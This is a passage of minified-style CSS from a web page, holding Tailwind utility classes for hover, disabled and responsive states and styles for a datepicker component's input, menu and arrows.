            background-color: rgb(219 234 254/var(--tw-bg-opacity, 1))
        }

        .hover\:bg-primary-100:hover {
            --tw-bg-opacity: 1;
            background-color: rgb(229 239 247/var(--tw-bg-opacity, 1))
        }

        .hover\:bg-slate-50:hover {
            --tw-bg-opacity: 1;
            background-color: rgb(248 250 252/var(--tw-bg-opacity, 1))
        }

        .hover\:bg-opacity-50:hover {
            --tw-bg-opacity: .5
        }

        .hover\:font-bold:hover {
            font-weight: 700
        }

        .hover\:\!text-primary:hover {
            --tw-text-opacity: 1 !important;
            color: rgb(0 90 171/var(--tw-text-opacity, 1)) !important
        }

        .hover\:text-primary:hover {
            --tw-text-opacity: 1;
            color: rgb(0 90 171/var(--tw-text-opacity, 1))
        }

        .hover\:underline:hover {
            text-decoration-line: underline
        }

        .hover\:opacity-80:hover {
            opacity: .8
        }

        .hover\:grayscale-\[50\%\]:hover {
            --tw-grayscale: grayscale(50%);
            filter: var(--tw-blur) var(--tw-brightness) var(--tw-contrast) var(--tw-grayscale) var(--tw-hue-rotate) var(--tw-invert) var(--tw-saturate) var(--tw-sepia) var(--tw-drop-shadow)
        }

        .focus\:border-primary:focus {
            --tw-border-opacity: 1;
            border-color: rgb(0 90 171/var(--tw-border-opacity, 1))
        }

        .focus\:border-transparent:focus {
            border-color: transparent
        }

        .focus\:ring-0:focus {
            --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);
            --tw-ring-shadow: var(--tw-ring-inset) 0 0 0 calc(var(--tw-ring-offset-width)) var(--tw-ring-color);
            box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)
        }

        .active\:opacity-50:active {
            opacity: .5
        }

        .disabled\:cursor-not-allowed:disabled {
            cursor: not-allowed
        }

        .disabled\:border-transparent:disabled {
            border-color: transparent
        }

        .disabled\:\!bg-gray-200:disabled {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(229 231 235/var(--tw-bg-opacity, 1)) !important
        }

        .disabled\:\!bg-gray-300:disabled {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(209 213 219/var(--tw-bg-opacity, 1)) !important
        }

        .disabled\:\!bg-primary:disabled {
            --tw-bg-opacity: 1 !important;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1)) !important
        }

        .disabled\:bg-bw-100:disabled {
            --tw-bg-opacity: 1;
            background-color: rgb(242 242 242/var(--tw-bg-opacity, 1))
        }

        .disabled\:bg-gray-100:disabled {
            --tw-bg-opacity: 1;
            background-color: rgb(243 244 246/var(--tw-bg-opacity, 1))
        }

        .disabled\:bg-gray-200:disabled {
            --tw-bg-opacity: 1;
            background-color: rgb(229 231 235/var(--tw-bg-opacity, 1))
        }

        .disabled\:text-\[\#808080\]:disabled {
            --tw-text-opacity: 1;
            color: rgb(128 128 128/var(--tw-text-opacity, 1))
        }

        .disabled\:text-bw-500:disabled {
            --tw-text-opacity: 1;
            color: rgb(134 134 134/var(--tw-text-opacity, 1))
        }

        .disabled\:text-gray-400:disabled {
            --tw-text-opacity: 1;
            color: rgb(156 163 175/var(--tw-text-opacity, 1))
        }

        .disabled\:text-gray-500:disabled {
            --tw-text-opacity: 1;
            color: rgb(107 114 128/var(--tw-text-opacity, 1))
        }

        .disabled\:text-opacity-55:disabled {
            --tw-text-opacity: .55
        }

        .disabled\:opacity-50:disabled {
            opacity: .5
        }

        .disabled\:checked\:\!bg-none:checked:disabled {
            background-image: none !important
        }

        .group:hover .group-hover\:block,
        .group\/edit:hover .group-hover\/edit\:block {
            display: block
        }

        .group:hover .group-hover\:\!flex {
            display: flex !important
        }

        .group:hover .group-hover\:grid {
            display: grid
        }

        .group:hover .group-hover\:-translate-y-5 {
            --tw-translate-y: -1.25rem;
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .peer:checked~.peer-checked\:bg-primary {
            --tw-bg-opacity: 1;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1))
        }

        .peer:checked~.peer-checked\:bg-primary-100 {
            --tw-bg-opacity: 1;
            background-color: rgb(229 239 247/var(--tw-bg-opacity, 1))
        }

        .peer:checked~.peer-checked\:after\:translate-x-full:after {
            content: var(--tw-content);
            --tw-translate-x: 100%;
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        .peer:checked~.peer-checked\:after\:border-white:after {
            content: var(--tw-content);
            --tw-border-opacity: 1;
            border-color: rgb(255 255 255/var(--tw-border-opacity, 1))
        }

        @media not all and (min-width:768px) {
            .max-md\:fixed {
                position: fixed
            }

            .max-md\:absolute {
                position: absolute
            }

            .max-md\:left-0 {
                left: 0
            }

            .max-md\:left-2 {
                left: .5rem
            }

            .max-md\:top-\[calc\(100\%\)\] {
                top: 100%
            }

            .max-md\:col-span-2 {
                grid-column: span 2/span 2
            }

            .max-md\:col-span-3 {
                grid-column: span 3/span 3
            }

            .max-md\:col-span-full {
                grid-column: 1/-1
            }

            .max-md\:col-start-2 {
                grid-column-start: 2
            }

            .max-md\:\!hidden {
                display: none !important
            }

            .max-md\:hidden {
                display: none
            }

            .max-md\:aspect-\[2\/1\] {
                aspect-ratio: 2/1
            }

            .max-md\:aspect-\[4\/1\] {
                aspect-ratio: 4/1
            }

            .max-md\:size-9 {
                height: 2.25rem;
                width: 2.25rem
            }

            .max-md\:h-11 {
                height: 2.75rem
            }

            .max-md\:h-9 {
                height: 2.25rem
            }

            .max-md\:min-h-\[calc\(100vh-128px\)\] {
                min-height: calc(100vh - 128px)
            }

            .max-md\:w-\[calc\(16\.66\%-4px\)\] {
                width: calc(16.66% - 4px)
            }

            .max-md\:w-\[calc\(83\.33\%-4px\)\] {
                width: calc(83.33% - 4px)
            }

            .max-md\:w-full {
                width: 100%
            }

            .max-md\:max-w-\[60vw\] {
                max-width: 60vw
            }

            .max-md\:flex-1 {
                flex: 1 1 0%
            }

            .max-md\:basis-1\/2 {
                flex-basis: 50%
            }

            .max-md\:scale-\[0\.6\] {
                --tw-scale-x: .6;
                --tw-scale-y: .6;
                transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
            }

            .max-md\:flex-col {
                flex-direction: column
            }

            .max-md\:flex-col-reverse {
                flex-direction: column-reverse
            }

            .max-md\:flex-wrap {
                flex-wrap: wrap
            }

            .max-md\:items-center {
                align-items: center
            }

            .max-md\:justify-center {
                justify-content: center
            }

            .max-md\:justify-between {
                justify-content: space-between
            }

            .max-md\:gap-2 {
                gap: .5rem
            }

            .max-md\:gap-3 {
                gap: .75rem
            }

            .max-md\:gap-4 {
                gap: 1rem
            }

            .max-md\:divide-y>:not([hidden])~:not([hidden]) {
                --tw-divide-y-reverse: 0;
                border-bottom-width: calc(1px*var(--tw-divide-y-reverse));
                border-top-width: calc(1px*(1 - var(--tw-divide-y-reverse)))
            }

            .max-md\:text-nowrap {
                text-wrap: nowrap
            }

            .max-md\:rounded-2xl {
                border-radius: 1rem
            }

            .max-md\:rounded-3xl {
                border-radius: 1.5rem
            }

            .max-md\:border {
                border-width: 1px
            }

            .max-md\:border-b {
                border-bottom-width: 1px
            }

            .max-md\:border-t {
                border-top-width: 1px
            }

            .max-md\:\!bg-primary {
                --tw-bg-opacity: 1 !important;
                background-color: rgb(0 90 171/var(--tw-bg-opacity, 1)) !important
            }

            .max-md\:\!bg-white {
                --tw-bg-opacity: 1 !important;
                background-color: rgb(255 255 255/var(--tw-bg-opacity, 1)) !important
            }

            .max-md\:bg-primary {
                --tw-bg-opacity: 1;
                background-color: rgb(0 90 171/var(--tw-bg-opacity, 1))
            }

            .max-md\:bg-white {
                --tw-bg-opacity: 1;
                background-color: rgb(255 255 255/var(--tw-bg-opacity, 1))
            }

            .max-md\:p-3 {
                padding: .75rem
            }

            .max-md\:p-4 {
                padding: 1rem
            }

            .max-md\:\!px-4 {
                padding-left: 1rem !important;
                padding-right: 1rem !important
            }

            .max-md\:px-2 {
                padding-left: .5rem;
                padding-right: .5rem
            }

            .max-md\:px-3 {
                padding-left: .75rem;
                padding-right: .75rem
            }

            .max-md\:py-1 {
                padding-bottom: .25rem;
                padding-top: .25rem
            }

            .max-md\:py-2 {
                padding-bottom: .5rem;
                padding-top: .5rem
            }

            .max-md\:py-4 {
                padding-bottom: 1rem;
                padding-top: 1rem
            }

            .max-md\:\!pl-16 {
                padding-left: 4rem !important
            }

            .max-md\:pl-5 {
                padding-left: 1.25rem
            }

            .max-md\:pt-4 {
                padding-top: 1rem
            }

            .max-md\:text-left {
                text-align: left
            }

            .max-md\:text-center {
                text-align: center
            }

            .max-md\:\!text-base {
                font-size: 1rem !important;
                line-height: 1.5rem !important
            }

            .max-md\:\!text-xs {
                font-size: .75rem !important;
                line-height: 1rem !important
            }

            .max-md\:text-sm {
                font-size: .875rem;
                line-height: 1.25rem
            }

            .max-md\:text-xs {
                font-size: .75rem;
                line-height: 1rem
            }

            .max-md\:\!text-primary {
                --tw-text-opacity: 1 !important;
                color: rgb(0 90 171/var(--tw-text-opacity, 1)) !important
            }

            .max-md\:text-white {
                --tw-text-opacity: 1;
                color: rgb(255 255 255/var(--tw-text-opacity, 1))
            }

            .\*\:max-md\:min-h-\[150px\]>* {
                min-height: 150px
            }

            .max-md\:\*\:flex-1>* {
                flex: 1 1 0%
            }

            .\*\:max-md\:flex-col>* {
                flex-direction: column
            }

            .\*\:max-md\:text-sm>* {
                font-size: .875rem;
                line-height: 1.25rem
            }

            .max-md\:\*\:text-xs>* {
                font-size: .75rem;
                line-height: 1rem
            }
        }

        @media not all and (min-width:640px) {
            .max-sm\:w-full {
                width: 100%
            }

            .max-sm\:flex-wrap {
                flex-wrap: wrap
            }

            .max-sm\:\!text-xs {
                font-size: .75rem !important;
                line-height: 1rem !important
            }
        }

        @media (min-width:640px) {
            .sm\:w-1\/2 {
                width: 50%
            }

            .sm\:grid-cols-3 {
                grid-template-columns: repeat(3, minmax(0, 1fr))
            }

            .sm\:grid-cols-7 {
                grid-template-columns: repeat(7, minmax(0, 1fr))
            }

            .sm\:\!text-sm {
                font-size: .875rem !important;
                line-height: 1.25rem !important
            }
        }

        @media (min-width:768px) {
            .md\:absolute {
                position: absolute
            }

            .md\:sticky {
                position: sticky
            }

            .md\:-left-16 {
                left: -4rem
            }

            .md\:-right-16 {
                right: -4rem
            }

            .md\:bottom-10 {
                bottom: 2.5rem
            }

            .md\:bottom-2 {
                bottom: .5rem
            }

            .md\:bottom-6 {
                bottom: 1.5rem
            }

            .md\:left-0 {
                left: 0
            }

            .md\:left-10 {
                left: 2.5rem
            }

            .md\:left-\[50\%\] {
                left: 50%
            }

            .md\:right-4 {
                right: 1rem
            }

            .md\:right-\[calc\(100\%-24px\)\] {
                right: calc(100% - 24px)
            }

            .md\:top-0 {
                top: 0
            }

            .md\:top-32 {
                top: 8rem
            }

            .md\:top-36 {
                top: 9rem
            }

            .md\:top-52 {
                top: 13rem
            }

            .md\:top-6 {
                top: 1.5rem
            }

            .md\:top-\[calc\(110\%\)\] {
                top: 110%
            }

            .md\:col-span-1 {
                grid-column: span 1/span 1
            }

            .md\:col-span-2 {
                grid-column: span 2/span 2
            }

            .md\:col-span-3 {
                grid-column: span 3/span 3
            }

            .md\:col-span-4 {
                grid-column: span 4/span 4
            }

            .md\:col-span-5 {
                grid-column: span 5/span 5
            }

            .md\:col-span-7 {
                grid-column: span 7/span 7
            }

            .md\:col-start-2 {
                grid-column-start: 2
            }

            .md\:ml-auto {
                margin-left: auto
            }

            .md\:mt-2 {
                margin-top: .5rem
            }

            .md\:mt-28 {
                margin-top: 7rem
            }

            .md\:mt-52 {
                margin-top: 13rem
            }

            .md\:mt-\[112px\] {
                margin-top: 112px
            }

            .md\:block {
                display: block
            }

            .md\:flex {
                display: flex
            }

            .md\:grid {
                display: grid
            }

            .md\:\!hidden {
                display: none !important
            }

            .md\:hidden {
                display: none
            }

            .md\:\!size-10 {
                height: 2.5rem !important;
                width: 2.5rem !important
            }

            .md\:\!size-12 {
                height: 3rem !important;
                width: 3rem !important
            }

            .md\:size-16 {
                height: 4rem;
                width: 4rem
            }

            .md\:size-24 {
                height: 6rem;
                width: 6rem
            }

            .md\:\!h-9 {
                height: 2.25rem !important
            }

            .md\:h-40 {
                height: 10rem
            }

            .md\:h-5 {
                height: 1.25rem
            }

            .md\:h-\[112px\] {
                height: 112px
            }

            .md\:h-\[354px\] {
                height: 354px
            }

            .md\:h-\[400px\] {
                height: 400px
            }

            .md\:h-\[calc\(100vh-112px\)\] {
                height: calc(100vh - 112px)
            }

            .md\:h-full {
                height: 100%
            }

            .md\:min-h-\[250px\] {
                min-height: 250px
            }

            .md\:w-1\/2 {
                width: 50%
            }

            .md\:w-1\/3 {
                width: 33.333333%
            }

            .md\:w-1\/4 {
                width: 25%
            }

            .md\:w-1\/6 {
                width: 16.666667%
            }

            .md\:w-2\/3 {
                width: 66.666667%
            }

            .md\:w-24 {
                width: 6rem
            }

            .md\:w-28 {
                width: 7rem
            }

            .md\:w-3\/4 {
                width: 75%
            }

            .md\:w-48 {
                width: 12rem
            }

            .md\:w-\[36\%\] {
                width: 36%
            }

            .md\:w-\[480px\] {
                width: 480px
            }

            .md\:min-w-60 {
                min-width: 15rem
            }

            .md\:min-w-\[400px\] {
                min-width: 400px
            }

            .md\:min-w-\[472px\] {
                min-width: 472px
            }

            .md\:max-w-\[46vw\] {
                max-width: 46vw
            }

            .md\:max-w-\[90\%\] {
                max-width: 90%
            }

            .md\:-translate-x-1\/2 {
                --tw-translate-x: -50%
            }

            .md\:-translate-x-1\/2,
            .md\:-translate-y-1\/2 {
                transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
            }

            .md\:-translate-y-1\/2 {
                --tw-translate-y: -50%
            }

            .md\:grid-cols-10 {
                grid-template-columns: repeat(10, minmax(0, 1fr))
            }

            .md\:grid-cols-12 {
                grid-template-columns: repeat(12, minmax(0, 1fr))
            }

            .md\:grid-cols-13 {
                grid-template-columns: repeat(13, minmax(0, 1fr))
            }

            .md\:grid-cols-2 {
                grid-template-columns: repeat(2, minmax(0, 1fr))
            }

            .md\:grid-cols-3 {
                grid-template-columns: repeat(3, minmax(0, 1fr))
            }

            .md\:grid-cols-4 {
                grid-template-columns: repeat(4, minmax(0, 1fr))
            }

            .md\:grid-cols-5 {
                grid-template-columns: repeat(5, minmax(0, 1fr))
            }

            .md\:grid-cols-6 {
                grid-template-columns: repeat(6, minmax(0, 1fr))
            }

            .md\:grid-cols-7 {
                grid-template-columns: repeat(7, minmax(0, 1fr))
            }

            .md\:grid-cols-8 {
                grid-template-columns: repeat(8, minmax(0, 1fr))
            }

            .md\:grid-rows-3 {
                grid-template-rows: repeat(3, minmax(0, 1fr))
            }

            .md\:flex-col {
                flex-direction: column
            }

            .md\:items-start {
                align-items: flex-start
            }

            .md\:items-end {
                align-items: flex-end
            }

            .md\:items-center {
                align-items: center
            }

            .md\:justify-end {
                justify-content: flex-end
            }

            .md\:justify-center {
                justify-content: center
            }

            .md\:gap-10 {
                gap: 2.5rem
            }

            .md\:gap-12 {
                gap: 3rem
            }

            .md\:gap-2 {
                gap: .5rem
            }

            .md\:gap-20 {
                gap: 5rem
            }

            .md\:gap-3 {
                gap: .75rem
            }

            .md\:gap-4 {
                gap: 1rem
            }

            .md\:gap-6 {
                gap: 1.5rem
            }

            .md\:gap-7 {
                gap: 1.75rem
            }

            .md\:gap-8 {
                gap: 2rem
            }

            .md\:divide-x>:not([hidden])~:not([hidden]) {
                --tw-divide-x-reverse: 0;
                border-left-width: calc(1px*(1 - var(--tw-divide-x-reverse)));
                border-right-width: calc(1px*var(--tw-divide-x-reverse))
            }

            .md\:whitespace-nowrap {
                white-space: nowrap
            }

            .md\:rounded-2xl {
                border-radius: 1rem
            }

            .md\:rounded-3xl {
                border-radius: 1.5rem
            }

            .md\:rounded-lg {
                border-radius: .5rem
            }

            .md\:rounded-xl {
                border-radius: .75rem
            }

            .md\:border-l {
                border-left-width: 1px
            }

            .md\:bg-white {
                --tw-bg-opacity: 1;
                background-color: rgb(255 255 255/var(--tw-bg-opacity, 1))
            }

            .md\:p-1 {
                padding: .25rem
            }

            .md\:p-2 {
                padding: .5rem
            }

            .md\:p-3 {
                padding: .75rem
            }

            .md\:p-4 {
                padding: 1rem
            }

            .md\:p-6 {
                padding: 1.5rem
            }

            .md\:p-8 {
                padding: 2rem
            }

            .md\:p-\[2px\] {
                padding: 2px
            }

            .md\:px-10 {
                padding-left: 2.5rem;
                padding-right: 2.5rem
            }

            .md\:px-3 {
                padding-left: .75rem;
                padding-right: .75rem
            }

            .md\:px-4 {
                padding-left: 1rem;
                padding-right: 1rem
            }

            .md\:px-6 {
                padding-left: 1.5rem;
                padding-right: 1.5rem
            }

            .md\:px-8 {
                padding-left: 2rem;
                padding-right: 2rem
            }

            .md\:px-9 {
                padding-left: 2.25rem;
                padding-right: 2.25rem
            }

            .md\:py-0 {
                padding-bottom: 0;
                padding-top: 0
            }

            .md\:py-10 {
                padding-bottom: 2.5rem;
                padding-top: 2.5rem
            }

            .md\:py-12 {
                padding-bottom: 3rem;
                padding-top: 3rem
            }

            .md\:py-16 {
                padding-bottom: 4rem;
                padding-top: 4rem
            }

            .md\:py-2 {
                padding-bottom: .5rem;
                padding-top: .5rem
            }

            .md\:py-20 {
                padding-bottom: 5rem;
                padding-top: 5rem
            }

            .md\:py-3 {
                padding-bottom: .75rem;
                padding-top: .75rem
            }

            .md\:py-4 {
                padding-bottom: 1rem;
                padding-top: 1rem
            }

            .md\:py-5 {
                padding-bottom: 1.25rem;
                padding-top: 1.25rem
            }

            .md\:py-6 {
                padding-bottom: 1.5rem;
                padding-top: 1.5rem
            }

            .md\:py-8 {
                padding-bottom: 2rem;
                padding-top: 2rem
            }

            .md\:\!pl-52 {
                padding-left: 13rem !important
            }

            .md\:pb-10 {
                padding-bottom: 2.5rem
            }

            .md\:pb-16 {
                padding-bottom: 4rem
            }

            .md\:pb-32 {
                padding-bottom: 8rem
            }

            .md\:pl-10 {
                padding-left: 2.5rem
            }

            .md\:pl-3 {
                padding-left: .75rem
            }

            .md\:pl-4 {
                padding-left: 1rem
            }

            .md\:pl-6 {
                padding-left: 1.5rem
            }

            .md\:pl-8 {
                padding-left: 2rem
            }

            .md\:pt-10 {
                padding-top: 2.5rem
            }

            .md\:pt-12 {
                padding-top: 3rem
            }

            .md\:pt-4 {
                padding-top: 1rem
            }

            .md\:pt-8 {
                padding-top: 2rem
            }

            .md\:\!text-base {
                font-size: 1rem !important;
                line-height: 1.5rem !important
            }

            .md\:text-2xl {
                font-size: 1.5rem;
                line-height: 2rem
            }

            .md\:text-3xl {
                font-size: 1.875rem;
                line-height: 2.25rem
            }

            .md\:text-4xl {
                font-size: 2.25rem;
                line-height: 2.5rem
            }

            .md\:text-base {
                font-size: 1rem;
                line-height: 1.5rem
            }

            .md\:text-lg {
                font-size: 1.125rem;
                line-height: 1.75rem
            }

            .md\:text-sm {
                font-size: .875rem;
                line-height: 1.25rem
            }

            .md\:text-xl {
                font-size: 1.25rem;
                line-height: 1.75rem
            }

            .md\:text-xs {
                font-size: .75rem;
                line-height: 1rem
            }

            .md\:text-primary {
                --tw-text-opacity: 1;
                color: rgb(0 90 171/var(--tw-text-opacity, 1))
            }

            .md\:shadow {
                --tw-shadow: 0 1px 3px 0 rgba(0, 0, 0, .1), 0 1px 2px -1px rgba(0, 0, 0, .1);
                --tw-shadow-colored: 0 1px 3px 0 var(--tw-shadow-color), 0 1px 2px -1px var(--tw-shadow-color)
            }

            .md\:shadow,
            .md\:shadow-sm {
                box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)
            }

            .md\:shadow-sm {
                --tw-shadow: 0 1px 2px 0 rgba(0, 0, 0, .05);
                --tw-shadow-colored: 0 1px 2px 0 var(--tw-shadow-color)
            }

            .\*\:md\:size-5>* {
                height: 1.25rem;
                width: 1.25rem
            }

            .md\:\*\:flex-1>* {
                flex: 1 1 0%
            }
        }

        @media (min-width:1024px) {
            .lg\:mt-36 {
                margin-top: 9rem
            }

            .lg\:w-2\/5 {
                width: 40%
            }

            .lg\:pb-24 {
                padding-bottom: 6rem
            }

            .lg\:\!text-base {
                font-size: 1rem !important;
                line-height: 1.5rem !important
            }

            .lg\:text-2xl {
                font-size: 1.5rem;
                line-height: 2rem
            }

            .lg\:text-\[18px\] {
                font-size: 18px
            }

            .lg\:text-lg {
                font-size: 1.125rem;
                line-height: 1.75rem
            }
        }

        .peer:checked~.rtl\:peer-checked\:after\:-translate-x-full:where([dir=rtl], [dir=rtl] *):after {
            content: var(--tw-content);
            --tw-translate-x: -100%;
            transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))
        }

        @media (prefers-color-scheme:dark) {
            .dark\:text-gray-200 {
                --tw-text-opacity: 1;
                color: rgb(229 231 235/var(--tw-text-opacity, 1))
            }
        }

        .\[\&\:not\(\:first-child\)\]\:scroll-mt-44:not(:first-child) {
            scroll-margin-top: 11rem
        }

        .\[\&\:not\(\:first-child\)\]\:py-4:not(:first-child) {
            padding-bottom: 1rem;
            padding-top: 1rem
        }

        .\[\&\:not\(\:last-child\)\]\:border-b:not(:last-child) {
            border-bottom-width: 1px
        }

        .\[\&\>\*\:not\(\:first-child\)\]\:pt-3>:not(:first-child) {
            padding-top: .75rem
        }

        .\[\&\>\.content\]\:justify-start>.content {
            justify-content: flex-start
        }

        .\[\&\>\.product\]\:\!border-0>.product {
            border-width: 0 !important
        }

        .\[\&\>\.product\]\:\!p-0>.product {
            padding: 0 !important
        }

        .\[\&\>div\>\.circle\]\:\!border-primary>div>.circle {
            --tw-border-opacity: 1 !important;
            border-color: rgb(0 90 171/var(--tw-border-opacity, 1)) !important
        }

        .\[\&\>div\>hr\]\:hidden>div>hr {
            display: none
        }

        .\[\&\>div\]\:bg-bw-500>div {
            --tw-bg-opacity: 1;
            background-color: rgb(134 134 134/var(--tw-bg-opacity, 1))
        }

        .\[\&\>div\]\:bg-primary>div {
            --tw-bg-opacity: 1;
            background-color: rgb(0 90 171/var(--tw-bg-opacity, 1))
        }

        @media not all and (min-width:768px) {
            .\[\&\>div\]\:max-md\:mt-\[300px\]>div {
                margin-top: 300px
            }
        }

        .\[\&\>img\]\:\!w-1\/2>img {
            width: 50% !important
        }

        .\[\&\>img\]\:w-1\/4>img {
            width: 25%
        }

        .\[\&\>img\]\:w-1\/5>img {
            width: 20%
        }

        @media not all and (min-width:768px) {
            .\[\&\>img\]\:max-md\:w-1\/2>img {
                width: 50%
            }

            .\[\&\>img\]\:max-md\:w-1\/3>img {
                width: 33.333333%
            }

            .max-md\:\[\&\>img\]\:w-1\/2>img {
                width: 50%
            }
        }

        @media (min-width:768px) {
            .\[\&\>img\]\:md\:w-1\/2>img {
                width: 50%
            }

            .\[\&\>img\]\:md\:w-1\/3>img {
                width: 33.333333%
            }

            .\[\&\>img\]\:md\:w-1\/4>img {
                width: 25%
            }

            .md\:\[\&\>img\]\:\!w-1\/6>img {
                width: 16.666667% !important
            }
        }

        .\[\&\>input\]\:\!h-12>input {
            height: 3rem !important
        }

        .\[\&\>input\]\:\!pl-14>input {
            padding-left: 3.5rem !important
        }

        .\[\&\>label\]\:text-sm>label {
            font-size: .875rem;
            line-height: 1.25rem
        }

        .\[\&\>label\]\:font-bold>label {
            font-weight: 700
        }

        .\[\&\>label\]\:text-bw-700>label {
            --tw-text-opacity: 1;
            color: rgb(86 86 86/var(--tw-text-opacity, 1))
        }

        .\[\&\>span\]\:text-sm>span {
            font-size: .875rem;
            line-height: 1.25rem
        }

        .\[\&\>span\]\:font-medium>span {
            font-weight: 500
        }

        .\[\&\>span\]\:text-bw-700>span {
            --tw-text-opacity: 1;
            color: rgb(86 86 86/var(--tw-text-opacity, 1))
        }

        .\[\&\>span\]\:text-primary>span {
            --tw-text-opacity: 1;
            color: rgb(0 90 171/var(--tw-text-opacity, 1))
        }
    </style>
    <style>
        .dp__input_wrap {
            box-sizing: unset;
            position: relative;
            width: 100%
        }

        .dp__input_wrap:focus {
            border-color: var(--dp-border-color-hover);
            outline: none
        }

        .dp__input_valid {
            box-shadow: 0 0 var(--dp-border-radius) var(--dp-success-color)
        }

        .dp__input_valid,
        .dp__input_valid:hover {
            border-color: var(--dp-success-color)
        }

        .dp__input_invalid {
            box-shadow: 0 0 var(--dp-border-radius) var(--dp-danger-color)
        }

        .dp__input_invalid,
        .dp__input_invalid:hover {
            border-color: var(--dp-danger-color)
        }

        .dp__input {
            background-color: var(--dp-background-color);
            border: 1px solid var(--dp-border-color);
            border-radius: var(--dp-border-radius);
            box-sizing: border-box;
            color: var(--dp-text-color);
            font-family: var(--dp-font-family);
            font-size: var(--dp-font-size);
            line-height: calc(var(--dp-font-size)*1.5);
            outline: none;
            padding: var(--dp-input-padding);
            transition: border-color .2s cubic-bezier(.645, .045, .355, 1);
            width: 100%
        }

        .dp__input::-moz-placeholder {
            opacity: .7
        }

        .dp__input::placeholder {
            opacity: .7
        }

        .dp__input:hover:not(.dp__input_focus) {
            border-color: var(--dp-border-color-hover)
        }

        .dp__input_reg {
            caret-color: transparent
        }

        .dp__input_focus {
            border-color: var(--dp-border-color-focus)
        }

        .dp__disabled {
            background: var(--dp-disabled-color)
        }

        .dp__disabled::-moz-placeholder {
            color: var(--dp-disabled-color-text)
        }

        .dp__disabled::placeholder {
            color: var(--dp-disabled-color-text)
        }

        .dp__input_icons {
            display: inline-block;
            height: var(--dp-font-size);
            width: var(--dp-font-size);
            stroke-width: 0;
            box-sizing: content-box;
            color: var(--dp-icon-color);
            font-size: var(--dp-font-size);
            line-height: calc(var(--dp-font-size)*1.5);
            padding: 6px 12px
        }

        .dp__input_icon {
            inset-inline-start: 0
        }

        .dp--clear-btn,
        .dp__input_icon {
            color: var(--dp-icon-color);
            cursor: pointer;
            position: absolute;
            top: 50%;
            transform: translateY(-50%)
        }

        .dp--clear-btn {
            align-items: center;
            background: transparent;
            border: none;
            display: inline-flex;
            inset-inline-end: 0;
            margin: 0;
            padding: 0
        }

        .dp__input_icon_pad {
            padding-inline-start: var(--dp-input-icon-padding)
        }

        .dp__menu {
            background: var(--dp-background-color);
            border: 1px solid var(--dp-menu-border-color);
            border-radius: var(--dp-border-radius);
            font-family: var(--dp-font-family);
            font-size: var(--dp-font-size);
            min-width: var(--dp-menu-min-width);
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none
        }

        .dp__menu,
        .dp__menu:after,
        .dp__menu:before {
            box-sizing: border-box
        }

        .dp__menu:focus {
            border: 1px solid var(--dp-menu-border-color);
            outline: none
        }

        .dp--menu-wrapper {
            position: absolute;
            z-index: 99999
        }

        .dp__menu_inner {
            padding: var(--dp-menu-padding)
        }

        .dp--menu--inner-stretched {
            padding: 6px 0
        }

        .dp__menu_index {
            z-index: 99999
        }

        .dp-menu-loading,
        .dp__menu_disabled,
        .dp__menu_readonly {
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            position: absolute;
            z-index: 999999
        }

        .dp__menu_disabled {
            background: #ffffff80;
            cursor: not-allowed
        }

        .dp__menu_readonly {
            background: transparent;
            cursor: default
        }

        .dp-menu-loading {
            background: #ffffff80;
            cursor: default
        }

        .dp--menu-load-container {
            align-items: center;
            display: flex;
            height: 100%;
            justify-content: center;
            width: 100%
        }

        .dp--menu-loader {
            animation: dp-load-rotation 1s linear infinite;
            border: var(--dp-loader);
            border-bottom-color: transparent;
            border-radius: 50%;
            box-sizing: border-box;
            display: inline-block;
            height: 48px;
            position: absolute;
            width: 48px
        }

        @keyframes dp-load-rotation {
            0% {
                transform: rotate(0)
            }

            to {
                transform: rotate(1turn)
            }
        }

        .dp__arrow_top {
            border-inline-end: 1px solid var(--dp-menu-border-color);
            border-top: 1px solid var(--dp-menu-border-color);
            top: 0;
            transform: translate(-50%, -50%) rotate(-45deg)
        }

        .dp__arrow_bottom,
        .dp__arrow_top {
            background-color: var(--dp-background-color);
            height: 12px;
            left: var(--dp-arrow-left);
            position: absolute;
            width: 12px
        }

        .dp__arrow_bottom {
            border-bottom: 1px solid var(--dp-menu-border-color);
            border-inline-end: 1px solid var(--dp-menu-border-color);
            bottom: 0;
            transform: translate(-50%, 50%) rotate(45deg)
        }

        .dp__action_extra {
            padding: 2px 0;
            text-align: center
        }

        .dp--preset-dates {
            border-inline-end: 1px solid var(--dp-border-color);
            padding: 5px
        }

        @media only screen and (width <=600px) {
            .dp--preset-dates {
                align-self: center;
                border: none;
                display: flex;
                max-width: calc(var(--dp-menu-width) - var(--dp-action-row-padding)*2);
                overflow-x: auto
            }
        }

        .dp--preset-dates-collapsed {
            align-self: center;
            border: none;
            display: flex;
            max-width: calc(var(--dp-menu-width) - var(--dp-action-row-padding)*2);
            overflow-x: auto
        }

        .dp__sidebar_left {
            border-inline-end: 1px solid var(--dp-border-color);
            padding: 5px
        }

        .dp__sidebar_right {
            margin-inline-end: 1px solid var(--dp-border-color);
            padding: 5px
